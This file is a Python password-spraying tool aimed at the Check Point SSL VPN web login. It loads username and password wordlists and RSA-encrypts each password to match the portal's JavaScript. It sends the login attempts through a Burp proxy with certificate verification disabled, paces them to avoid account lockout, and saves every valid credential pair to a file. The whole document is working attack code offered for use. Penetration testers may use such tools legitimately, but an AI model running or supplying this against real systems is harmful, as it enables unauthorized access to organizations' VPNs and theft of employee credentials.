#!/usr/bin/env python
# -*-coding:Utf-8- -*

import sys
import os
import argparse
import time
import concurrent.futures
import requests
from urllib.parse import urlparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from Crypto.PublicKey  import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Hash import SHA
from binascii import hexlify

# NOTE we passing the request to burp. If you don't need it, deactivate it at line 112

#Disabling HTTPS certificate verification
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#User Args: Username wordlist, password wordlist and Cookies needs to be modified. Check in Burp. 
Headers={"Content-Type": "application/x-www-form-urlencoded"}
Cookies={"CheckCookieSupport":"1","selected_realm":"ssl_vpn"}
usernameList="./user.txt"
passwordList="./pass.txt"

#User arguments function
def get_Args():
    parser = argparse.ArgumentParser(description='Password Spray tool for CheckPoint VPN web interface: python3 checkpointSpray.py -u https://acces.company.com/Login/Login -a 2 -t 30')
    parser.add_argument('-u','--url', help='CheckPoint Login URL to spray', required=True)
    parser.add_argument('-a','--attempt',help='Number of attempts to be run per user at each timer loop', type=int, required=True)
    parser.add_argument('-t','--time',help='Relaunch spray every X minutes', type=int, required=True)
    args = parser.parse_args()
	
    return args
	

if sys.version_info >= (3,) :
    def b_ord (x) :
        return x
else :
    def b_ord (x) :
        return ord (x)

def iterbytes (x) :
    if sys.version_info >= (3,) :
        x = bytes (x)
    else :
        x = b''.join (x)
    for i in range (len (x)) :
        yield (x [i:i+1])
# end def iterbytes

def pubkey(password):
    # Exponent (e) and Modulus (m) are stored within the JavaScript file JS_RSA.JS (var modulus / var exponent)
    e = int('XXXXXXXXXXXX', 16)
    m = int('XXXXXXXXXXXXXXXXX', 16)
    pubkey = RSA.construct((m, e))
    cipher = PKCS1_v1_5.new(pubkey)
    # Encrypt the password
    encrypted_data = cipher.encrypt(password.encode('utf-8'))
    # Convert the encrypted data to a hexadecimal string
    encrypted_hex = hexlify(encrypted_data).decode()
    return encrypted_hex


def pad(password, pubkey):
    # Getting the size in bytes directly
    l = pubkey.size_in_bytes()
    r = []
    r.append(b'\0')

    for x in iterbytes(reversed(password.encode('utf-8'))):
        r.append(x)
    r.append(b'\0')
    n = l - len(r) - 2
    
    r.append(os.urandom(n))
    r.append(b'\x02')
    r.append(b'\x00')

    return b''.join(reversed(r))
    # end def pad

def encrypt(password, pubkey):
    cipher = PKCS1_OAEP.new(pubkey, hashAlgo=SHA)
    encrypted_data = cipher.encrypt(password.encode('utf-8'))
    # Convert encrypted data to hex string
    encrypted_hex = ''.join('{:02x}'.format(x) for x in encrypted_data)
    return encrypted_hex



def spray(url, usernameList, passwordList, attempt, loop):
    counter = 1
    proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
    passwords = open(passwordList, "r")
    for password in passwords:
        passwd = (password.strip("\n"))
        print("\n########### Starting with password : "+passwd+" ########### Attempt = "+ str(counter) +"\n")
                
        users = open(usernameList, "r")    
        encryptedpass = pubkey(passwd)
        for user in users:
            username = (user.strip("\n"))

            data = {"selectedReal": "ssl_vpn", "loginType": "Standard", "userName": username,"password": encryptedpass}
            req = requests.post(url, data=data, headers=Headers, cookies=Cookies, verify=False, allow_redirects=False, proxies=proxies)
            
            print("--- Username : "+username+" : "+passwd)

            if req.cookies.get('AuthSessionID'):
                print("+++++++++ Found VALID credentials: "+ username + " : " + passwd + " +++++++++")
                result = open("./credentials.txt", "a")
                result.write(username+":"+passwd+"\n")
                result.close()
            else:
                pass

        counter = counter + 1
        if counter > attempt:
            print("\n.......... Sleeping for "+ str(loop) + "min after password : " + passwd + "..........")        
            time.sleep(loop*60)
        else:
            pass

if __name__ == "__main__":
    args = get_Args()
    print(" ==> Launching Password Spray against following target :\n")
    print(" - CheckPoint URL : %s" % args.url)
    spray(args.url, usernameList, passwordList, args.attempt, args.time)
